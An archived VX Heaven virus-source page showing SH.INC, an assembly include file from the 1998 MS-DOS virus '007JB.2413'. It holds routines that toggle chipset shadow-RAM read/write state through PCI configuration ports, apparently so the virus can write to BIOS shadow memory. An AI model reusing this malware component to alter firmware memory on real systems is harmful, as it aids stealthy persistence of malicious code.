<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>007JB.2413 ver.1.01.2 Beta - Virus for MS-DOS written by 007JB (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, ĞºĞ¾Ğ¼Ğ¿ÑŒÑÑ‚ĞµÑ€Ğ½Ñ‹Ğµ Ğ²Ğ¸Ñ€ÑƒÑÑ‹, Ğ²Ğ¸Ñ€ÑƒÑ, Ğ²Ğ¸Ñ€Ğ¸"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0da799ba98e0c0f93497b61cae746ead6f368740-1498759686-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Ğ ÑƒÑÑĞºĞ¸Ğ¹</option><option selected="selected" value="en">English</option><option value="ua">Ğ£ĞºÑ€Ğ°Ñ—Ğ½ÑÑŒĞºĞ°</option><option value="de">Deutsch</option><option value="es">EspaÃ±ol</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>007JB.2413 ver.1.01.2 Beta</h2><p><em>Virus for MS-DOS</em></p><p><strong>007JB</strong><br/><small><a href="/src.php?author=007JB">Show all viruses by this author</a></small></p><small><a href="/src.php?info=007.zip">Description and download</a></small><br/><p>1998-06-00</p><h2>SH.INC</h2> [<a href="/src_view.php?file=007.zip">Index</a>] [<a href="/src_view.php?file=007.zip&amp;view=SH.INC&amp;highlight=off">Turn off syntax highlighting</a>] <hr/><pre class="asm" style="font-family:monospace;color: #000066; background-color: #cccbbb;">&nbsp;
<span style="color: black; font-style: italic;">;                ÚÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ unused</span>
<span style="color: black; font-style: italic;">;                ³³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ reserved</span>
<span style="color: black; font-style: italic;">;                 </span>
<span style="color: black; font-style: italic;">; BX=readable    00x? xxxx xxxx xxxx B</span>
<span style="color: black; font-style: italic;">; CX=writeable   00x? xxxx xxxx xxxx B</span>
<span style="color: black; font-style: italic;">; DX=cacheable   00x? xxxx xxxx xxxx B</span>
<span style="color: black; font-style: italic;">; SI=reserved    00x? xxxx xxxx xxxx B</span>
<span style="color: black; font-style: italic;">;                      </span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³³ ³³³ÀÄÄ EC00, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³³ ³³ÀÄÄÄ E800, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³³ ³ÀÄÄÄÄ E400, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³³ ÀÄÄÄÄÄ E000, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³³</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³³ÀÄÄÄÄÄÄÄ DC00, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³³ÀÄÄÄÄÄÄÄÄ D800, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ³ÀÄÄÄÄÄÄÄÄÄ D400, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³ ÀÄÄÄÄÄÄÄÄÄÄ D000, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³³</span>
<span style="color: black; font-style: italic;">;                  ³  ³³³ÀÄÄÄÄÄÄÄÄÄÄÄÄ CC00, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³³ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ C800, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ³ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄ C400, 16K</span>
<span style="color: black; font-style: italic;">;                  ³  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ C000, 16K</span>
<span style="color: black; font-style: italic;">;                  ³</span>
<span style="color: black; font-style: italic;">;                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ F000, 64k</span>
&nbsp;
&nbsp;
sh_R            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #46aa03; font-weight: bold;">bx</span>
sh_W            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>
sh_C            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #46aa03; font-weight: bold;">dx</span>
sh_X            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
&nbsp;
seg_all         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0010111111111111b</span>
&nbsp;
seg_F000_64k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0010000000000000b</span>
&nbsp;
seg_C000_64k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000111100000000b</span>
seg_C000_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000110000000000b</span>
seg_C800_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000001100000000b</span>
seg_C000_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000100000000000b</span>
seg_C400_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000010000000000b</span>
seg_C800_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000001000000000b</span>
seg_CC00_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000100000000b</span>
&nbsp;
seg_D000_64k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000011110000b</span>
seg_D000_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000011000000b</span>
seg_D800_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000110000b</span>
seg_D000_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000010000000b</span>
seg_D400_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000001000000b</span>
seg_D800_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000100000b</span>
seg_DC00_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000010000b</span>
&nbsp;
seg_E000_64k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000001111b</span>
seg_E000_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000001100b</span>
seg_E800_32k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000000011b</span>
seg_E000_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000001000b</span>
seg_E400_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000000100b</span>
seg_E800_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000000010b</span>
seg_EC00_16k    <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0000000000000001b</span>
&nbsp;
&nbsp;
read_cf8<span style="color: #339933;">:</span>
cf8_read<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">8000h</span>
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">not</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0CF8h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
write_cf8<span style="color: #339933;">:</span>
cf8_write<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">8000h</span>
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #00007f; font-weight: bold;">not</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0CF8h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
get_sh_state<span style="color: #339933;">:</span>   <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0059h</span>
&nbsp;
@@<span style="color: #ff0000;">1</span><span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    cf8_read
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span>
&nbsp;
@@<span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcl</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcl</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcl</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcl</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ah</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     @@<span style="color: #ff0000;">2</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">005fh</span>
                <span style="color: #00007f; font-weight: bold;">jbe</span>     @@<span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
set_sh_state<span style="color: #339933;">:</span>   <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">005Fh</span>
&nbsp;
@@<span style="color: #ff0000;">1</span><span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span>
&nbsp;
@@<span style="color: #ff0000;">2</span><span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcr</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcr</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcr</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">rcr</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ah</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     @@<span style="color: #ff0000;">2</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    cf8_write
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0059h</span>
                <span style="color: #00007f; font-weight: bold;">jae</span>     @@<span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=007.zip&amp;view=SH.INC">de</a><a href="/src_view.php?lang=en&amp;file=007.zip&amp;view=SH.INC">en</a><a href="/src_view.php?lang=es&amp;file=007.zip&amp;view=SH.INC">es</a><a href="/src_view.php?lang=it&amp;file=007.zip&amp;view=SH.INC">it</a><a href="/src_view.php?lang=fr&amp;file=007.zip&amp;view=SH.INC">fr</a><a href="/src_view.php?lang=pl&amp;file=007.zip&amp;view=SH.INC">pl</a><a href="/src_view.php?lang=ru&amp;file=007.zip&amp;view=SH.INC">ru</a><a href="/src_view.php?lang=ua&amp;file=007.zip&amp;view=SH.INC">ua</a></div>
</body>
</html>
